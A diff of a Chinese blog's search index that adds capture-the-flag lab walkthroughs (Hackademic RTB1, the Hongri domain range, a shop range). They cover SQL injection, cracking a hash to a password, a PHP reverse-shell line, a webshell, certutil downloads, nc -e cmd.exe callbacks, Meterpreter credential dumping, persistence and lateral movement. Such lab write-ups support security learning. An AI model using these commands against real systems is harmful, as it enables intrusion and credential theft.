@@ -1,6 +1,288 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hackdamic靶机</title>
+    <url>/2023/10/18/Hackdamic%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<p><strong>Hackdamic靶机</strong></p>
+<p>靶机操作过程：</p>
+<p>扫描虚拟机：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps77.jpg" alt="img"> </p>
+<p>编辑虚拟机设置：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps78.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps79.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps80.jpg" alt="img"> </p>
+<p>信息收集</p>
+<p>Nmap扫描</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps81.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps82.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps83.jpg" alt="img"> </p>
+<p>可以看到开放的端口和对应的服务</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22&#x2F;tcp</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80&#x2F;tcp</td>
+<td>web</td>
+</tr>
+</tbody></table>
+<p>Attempt to access port 80</p>
+<p>1.3 scan information on web page</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps84.jpg" alt="img"> </p>
+<p>1.3.1Plug-in viewing framework</p>
+<p><a href="http://192.168.182.131/Hackademic_RTB1/?p=%E2%80%99%E2%80%A6%E2%80%99">http://192.168.182.131/Hackademic_RTB1/?p=’…’</a></p>
+<p><a href="http://192.168.31.162/Hackademic_RTB1/?cat=1">http://192.168.182.131/Hackademic_RTB1&#x2F;?cat&#x3D;1</a></p>
+<p>考反弹shell</p>
+<p>使用dirsearch scan</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps85.jpg" alt="img"> </p>
+<p>没有结果，换一个路径</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps86.jpg" alt="img"> </p>
+<p>找到后台</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps87.jpg" alt="img"> </p>
+<p>有两种方法</p>
+<p>1.sql注入</p>
+<p>2.弱密码爆破</p>
+<p>查看网页源代码看看有没有cms的信息</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps88.jpg" alt="img"> </p>
+<p>我们直接看到这个cms是WordPress的1.5.1.1版本。然后可以searchsploit一下有啥漏洞：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps89.jpg" alt="img"> </p>
+<p>重点观察版本匹配的开头两个，说存在<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>，因此接下来的渗透重点关注SQL注入</p>
+<p>尝试SQL注入吧，在参数最后加一个引号，把参数改为cat&#x3D;1’</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps90.jpg" alt="img"> </p>
+<p> 报错了，而且回显了数据库查询语句：</p>
+<p>SELECT * FROM wp_categories WHERE cat_ID &#x3D; 1\&#39; LIMIT 1</p>
+<p>先尝试获取数据库到底有多少列，通过order by [num]的方法（按照第[num]列排序），只要页面没有出现报错，就说明数据库至少有[num]列。order by 5是的界面如下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps91.jpg" alt="img"> </p>
+<p> order by 6时出现了报错，说明数据库中一共有5列数据：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps92.jpg" alt="img"> </p>
+<p>接下来用联合查询的方法进行注入，思考SQL查询语句，要保证后台执行我们的联合查询union select语句，只要将cat_ID的值设置为0，这样就无法查询到结果，相当于只执行了union select的语句。如果将url中的参数改为cat&#x3D;0 union select 1,2,3,4,5那么SQL查询语句将会是：</p>
+<p>SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0 union select 1,2,3,4,5 LIMIT 1</p>
+<p>LIMIT 1限制了只会显示一条结果，由于SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0无法查询到结果，因此相当于只执行了select 1,2,3,4,5 LIMIT 1，界面如下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps93.jpg" alt="img"> </p>
+<p> 此处非常关键，注意上图中引号内的内容变为了2，因此select 1,2,3,4,5这个语句中2的位置可以进行查询，并回显到前端，我们可以把2修改为version()以查询MySQL的版本，这样参数修改为cat &#x3D; 0 union select 1,version(),3,4,5结果如下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps94.jpg" alt="img"> </p>
+<p>回显了版本</p>
+<p>由于WordPress是非常著名的cms，他的配置是固定的，可以Google查到WordPress1.5.1.1对应的数据库结构</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps95.jpg" alt="img"> </p>
+<p>找到了wordpress 1.5.1版本下存在的表的结构，有一个名为wp_users的表，下面有user_login,user_pass,user_level（用户名，密码，权限）等关心的列</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps96.jpg" alt="img"> </p>
+<p>select id,user_login,user_pass,user_level from wp-users</p>
+<p>比如可以查询user_login试试cat&#x3D;0 union select 1,user_login,3,4,5 from wp_users</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps97.jpg" alt="img"> </p>
+<p>成功查到了一天账号GeorgeMiller，但受限于LIMIT 1,我们只看到了这一个用户，此时可以用group_concat函数让一行内显示所有信息：</p>
+<p>cat&#x3D;0 union select 1,group_concat(user_login),3,4,5 from wp_users</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps98.jpg" alt="img"> </p>
+<p>把id，user_login，user_pass ，user_level这几个都注入出来</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps99.jpg" alt="img"> </p>
+<p>可以找到权限级别user_level最高的用户是GeorgeMiller，他的user_level是10，然后我们破解他的密码哈希7cbb3252ba6b7e9c422fac5334d22054</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps100.jpg" alt="img"> </p>
+<p>很容易得到是md5，然后找个在线网站Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online破解即可：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps101.jpg" alt="img"> </p>
+<p>密码是q1w2e3</p>
+<p>下面通过用户名GeorgeMiller，密码q1w2e3登录WordPress后台</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps102.jpg" alt="img"> </p>
+<p>设置允许php文件上传</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps103.jpg" alt="img"> </p>
+<p>设置成功后，我们可以发现菜单中出现了Upload界面，我们可以上传一个反弹shell的php文件，即shell.php，代码如下，其中10.10.10.128是kali的ip，1234是一会接收shell的端口：</p>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'"); ?><p>上传成功且路径是&#x2F;wp-content&#x2F;，下面只要开启nc监听，并访问&#x2F;wp-content&#x2F;shell.php即可接收到反弹shell：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps104.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps105.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps106.jpg" alt="img"> nc监听成功收到了反弹shell</p>
+<p><em><strong>*最后进行内核提权*</strong></em></p>
+<p>先用python增强shell的交互性：</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p>查看当前用户：</p>
+<p>是apache，然后查看内核版本，是2.6.31：</p>
+<p>用sudo -l查看当前用户权限：</p>
+<p>很遗憾，需要密码。此路不通。</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps107.jpg" alt="img"> </p>
+<p> 由于22端口的SSH服务没有开放，所以对于提权来说，寻找SSH登录密码是没有意义的，而我们看到的内核版本又比较老旧，因此可采用内核提权的方法。在searchsploit中搜索Linux kernel 2.6.3版本的提权漏洞：</p>
+<p>searchsploit linux kernel 2.6.3 | grep -i ‘Privilege Escalation’ </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps108.jpg" alt="img"> </p>
+<p>尝试15258.c，发现可以提权，过程如下，先把漏洞利用文件下载下来</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps109.jpg" alt="img"> </p>
+<p>然后把他传到靶机的&#x2F;tmp目录下，先在kali中启动一个http服务：</p>
+<p>php -S 0:80</p>
+<p>然后在靶机&#x2F;tmp目录下wget，把kali中的15285.c下载下来：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps110.jpg" alt="img"> </p>
+<p>在靶机中用gcc编译，就直接命名为15285得了</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps111.jpg" alt="img"> </p>
+<p> 然后直接运行即可提权</p>
+<p>进入&#x2F;root目录，查看key.txt</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps112.jpg" alt="img"> </p>
+<p>成功拿到了flag，至此打靶成功</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>红日靶场</title>
+    <url>/2023/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</url>
+    <content><![CDATA[<p><strong>红日靶场</strong></p>
+<p>编辑虚拟网络</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps113.jpg" alt="img"> </p>
+<p>kali</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps114.jpg" alt="img"> </p>
+<p>Win 7</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps115.jpg" alt="img"> </p>
+<p>Win2K3&#x2F;2008 R2</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps116.jpg" alt="img"> </p>
+<p>查看本机ip</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps117.jpg" alt="img"> </p>
+<p>开靶机和未开靶机对比，得知目标主机IP为192.168.229.129</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps118.jpg" alt="img"> </p>
+<p>启动Win7中的Web服务</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps119.jpg" alt="img"> </p>
+<p>nmap扫描一下目标主机，发现开放了80, 3306端口</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps120.jpg" alt="img"> </p>
+<p>对目标进行访问，发现默认页面为phpStudy 探针,泄露大量信息。</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps121.jpg" alt="img"> </p>
+<p>目录扫描，发现后台登录界面的网址</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps122.jpg" alt="img"> </p>
+<p>尝试访问</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps123.jpg" alt="img"> </p>
+<p>抓包发现没有进行防爆破，尝试进行爆破</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps124.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps125.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps126.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps127.jpg" alt="img"> </p>
+<p>账密为root&#x2F;root,进入后台</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps128.jpg" alt="img"> </p>
+<p>将变量中的general log更改为ON，将general log file的路径更改为当前网站根目录下路径C:\phpStudy\WWW\test.php。（开启 SQL 的通用查询日志功能，并将日志文件保存在该路径）<img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps129.jpg" alt="img"></p>
+<p>在SQL界面写入一句话木马</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps130.jpg" alt="img"> </p>
+<p>访问<a href="http://192.168.229.129/test.php?test=phpinfo();%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E6%8F%92%E5%85%A5">http://192.168.229.129/test.php?test=phpinfo();验证成功插入</a></p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps131.jpg" alt="img"> </p>
+<p>将nc和wget.exe放入&#x2F;var&#x2F;www&#x2F;html目录下，然后启动Apache服务。</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps132.jpg" alt="img"> </p>
+<p>查看服务的状态</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps133.jpg" alt="img"> </p>
+<p>服务已正常启动，访问127.0.0.1看到默认页面</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps134.jpg" alt="img"> </p>
+<p>WEBSHELL中执行，完整命令为<a href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“certutil -urlcache -split -f <a href="http://192.168.229.128/wget.exe">http://192.168.229.128/wget.exe</a> C:\phpStudy\WWW\wget.exe”);</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps135.jpg" alt="img"> </p>
+<p>通过Windows下的dir命令查看,<a href="http://192.168.229.129/test.php?test=system(%22dir%22)">http://192.168.229.129/test.php?test=system(&quot;dir&quot;)</a>;</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps136.jpg" alt="img"> </p>
+<p>之后使用wget将整个nc的文件夹下载下来。WEBSHELL中执行wget -r -np -nH –cut-dirs&#x3D;1 <a href="http://192.168.100.128/nc/">http://192.168.100.128/nc/</a></p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps137.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps138.jpg" alt="img"> </p>
+<p>之后在kali上进行监听，再让Win7连接kali。靶机的WEBSHELL中执行nc 192.168.229.128 8888 -e cmd.exe</p>
+<p><a href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“nc 192.168.229.128 8888 -e cmd.exe”);</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps139.jpg" alt="img"> </p>
+<p>攻击机执行nc -vlp 8888</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps140.jpg" alt="img"> </p>
+<p>权限维持与内网信息收集</p>
+<p>首先修改cmd的字符编码为utf-8（chcp 65001），以此来避免乱码问题</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps141.jpg" alt="img"> </p>
+<p>获取系统信息</p>
+<p>有用信息：1.主机加了一个域god.org</p>
+<p>2.此主机的网络配置，内网网段包含192.168.52.143</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps142.jpg" alt="img"> </p>
+<p>Whoami得知我们现在的用户为administrator，属于god域</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps143.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps144.jpg" alt="img"> </p>
+<p>关闭windows防火墙</p>
+<p>（”netsh” 是一个用于配置和监控各种网络设置的命令行工具。”advfirewall” 是 Windows Firewall（也称为Windows防火墙）的管理组件。”set currentprofile” 表示该命令将应用于当前活动的配置文件，即当前正在使用的防火墙配置文件。”state off” 意味着将关闭当前活动的防火墙配置文件。）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps145.jpg" alt="img"> </p>
+<p>修改注册表以允许远程桌面连接</p>
+<p>HKEY_LOCAL_MACHINE” 分支下的 “SYSTEM\CurrentControlSet\Control\Terminal Server:修改的位置</p>
+<p>&#x2F;v fDenyTSConnections：修改的键值名称 fDenyTSConnections 是表示是否允许远程桌面连接的</p>
+<p>&#x2F;t REG_DWORD：设定数据类型</p>
+<p>&#x2F;d 0：设置数据</p>
+<p>&#x2F;f：强制操作</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps146.jpg" alt="img"> </p>
+<p>启动远程桌面服务</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps147.jpg" alt="img"> </p>
+<p>进行远程桌面连接</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps148.jpg" alt="img"> </p>
+<p>创建一个msf的木马，将这个木马移动到&#x2F;var&#x2F;www&#x2F;html文件夹下</p>
+<p>-p    指定payload</p>
+<p>LHOST  攻击机IP</p>
+<p>LPORT  监听端口</p>
+<p>-f    确定输出格式</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps149.jpg" alt="img"> </p>
+<p>让目标下载这个木马</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps150.jpg" alt="img"> </p>
+<p>进入msf框架的命令行</p>
+<p>use exploit&#x2F;multi&#x2F;handler使用“多模块”漏洞利用程序</p>
+<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp设置要使用的负载类型，指定了Windows 64位操作系统上的Meterpreter负载</p>
+<p>set lhost设置攻击机器的IP地址</p>
+<p>set lport设置监听端口号</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps151.jpg" alt="img"> </p>
+<p>运行木马</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps152.jpg" alt="img"> </p>
+<p>成功返回结果</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps153.jpg" alt="img"> </p>
+<p>getsystem进一步提权，getuid查看提权结果</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps154.jpg" alt="img"> </p>
+<p>导入kiwi模块，获取到系统中的用户名和密码</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps155.jpg" alt="img"> </p>
+<p>creds_all获取目标系统上存储的凭据信息</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps156.jpg" alt="img"> </p>
+<p>设置一个定时任务，以免连接被断开。（taskschd.msc打开任务计划程序）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps157.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps158.jpg" alt="img"> </p>
+<p>创建完成，重启win7进行验证</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps159.jpg" alt="img"> </p>
+<p>在攻击机上监听</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps160.jpg" alt="img"> </p>
+<p>下面是内网信息收集</p>
+<p>查看当前计算机&#x2F;域基本信息（net config workstation）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps161.jpg" alt="img"> </p>
+<p>已经知道了当前主机在GOD域中</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps162.jpg" alt="img"> </p>
+<p>可知域控主机名为OWA</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps163.jpg" alt="img"> </p>
+<p>查询域用户</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps164.jpg" alt="img"> </p>
+<p>查看域的密码策略</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps165.jpg" alt="img"> </p>
+<p>获取域管理员列表</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps166.jpg" alt="img"> </p>
+<p>扫描当前内网网段，扫描出了138&#x2F;141两个IP（143前面已经知道是跳板机IP）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps167.jpg" alt="img"> </p>
+<p>ping一下OWA查看域控的IP</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps168.jpg" alt="img"> </p>
+<p>至此内网的基本信息收集结束</p>
+<p>横向移动</p>
+<p>对域控进行扫描</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps169.jpg" alt="img"> </p>
+<p>通过上面的信息收集，我们发现我们当前的账号在域中有登记，并不只是本地账户，因此我们可以尝试与域控直接进行IPC连接。</p>
+<p>发现同时开启了139&#x2F;445端口，有可能可以进行IPC连接。</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps170.jpg" alt="img"> </p>
+<p>net use \目标IP\ipc$ “密码” &#x2F;user:”账户”，它的作用是使用 IPC（Inter-Process Communication，进程间通信）连接到目标 IP 地址上的 ipc$ 共享资源。</p>
+<p>net use 命令可以将本地系统的某个共享资源映射到远程系统上，并进行访问。</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps171.jpg" alt="img"> </p>
+<p>尝试操控目标主机</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps172.jpg" alt="img"> </p>
+<p>尝试让目标主机运行nc</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps173.jpg" alt="img"> </p>
+<p>查看目标当前的时间</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps174.jpg" alt="img"> </p>
+<p>使用at命令为目标创建一个计划任务，让其在指定的时间运行命令</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps175.jpg" alt="img"> </p>
+<p>Win7上开启监听，到时间后成功回弹</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps176.jpg" alt="img"> </p>
+<p>之后尝试将shell反弹回攻击机上</p>
+<p>在Win7上创建一个端口转发</p>
+<p>listenaddress：监听地址</p>
+<p>listenport：监听端口</p>
+<p>connectaddress：连接地址</p>
+<p>connectport：连接端口</p>
+<p>netsh interface portproxy show v4tov4：显示当前系统中的转发规则</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps177.jpg" alt="img"> </p>
+<p>之后让域控连接Win7的9999端口</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps178.jpg" alt="img"> </p>
+<p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps179.jpg" alt="img"> </p>
+]]></content>
+  </entry>
+  <entry>
     <title>杂乱的思考</title>
     <url>/2023/10/14/Hello-My-Blog/</url>
     <content><![CDATA[<p>消失不见好久的勇气，今天意外出现了…</p>
@@ -25,11 +307,6 @@
 <p>Whether sixty or sixteen, there is in every human being’s heart the lure of wonders, the unfailing childlike appetite of what’s next and the joy of the game of living. In the centre of your heart and my heart there is a wireless station: so long as it receives messages of beauty, hope, cheer, courage and power from men and from the infinite, so long are you young.</p>
 <p>When the aerials are down, and your spirit is covered with snows of cynicism and the ice of pessimism, then you are grown old, even at twenty, but as long as your aerials are up, to catch waves of optimism, there is hope you may die young at eighty.</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>红日靶场</title>
-    <url>/2024/03/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>w1r3s靶场</title>
@@ -132,5 +409,144 @@
       <tags>
         <tag>Web</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>其他靶场+封神台</title>
+    <url>/2023/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<p><strong>shop靶场</strong></p>
+<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
+<p>首先，打开虚拟机：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps1.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps2.jpg" alt="img"></p>
+<p>然后双击打开shop1:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps3.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps4.jpg" alt="img"></p>
+<p>再次双击</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps5.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps6.jpg" alt="img"></p>
+<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps7.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps8.png" alt="img"></p>
+<p>点击关闭:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps9.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps10.png" alt="img"></p>
+<p>现在再点击就能打开了，如图：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps11.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps12.png" alt="img"></p>
+<p>点击第一行：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps13.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps14.png" alt="img"></p>
+<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps15.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps16.png" alt="img"></p>
+<p>先来试试弱密码：账号：admin 密码：admin</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps17.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps18.png" alt="img"></p>
+<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps19.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps20.jpg" alt="img"></p>
+<p>接下来来试一下加强了难度的shop2:</p>
+<p>打开过程和第一个一样，我就不赘述了。</p>
+<p> 我们要进入后台先要找到后台登录页面，我开始时用御剑扫描，但是一直没扫到，用wwwscan扫描时不知出了什么问题，也没扫出来。幸运的是，机缘巧合之下发现了网站的后台：</p>
+<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
+<p>我们跳转到网页后台登录页面：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps21.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps22.png" alt="img"></p>
+<p>试一试之前试过的弱密码，失败了：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps23.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps24.png" alt="img"></p>
+<p>那怎么办呢？接下来，我们进行sql注入，打开阿D注入工具</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps25.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps26.jpg" alt="img"></p>
+<p>将注入链接里面的IP地址改成我们现在的地址，点击检测：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps27.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps28.jpg" alt="img"></p>
+<p>点击检测标段，再点击admin</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps29.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps30.jpg" alt="img"></p>
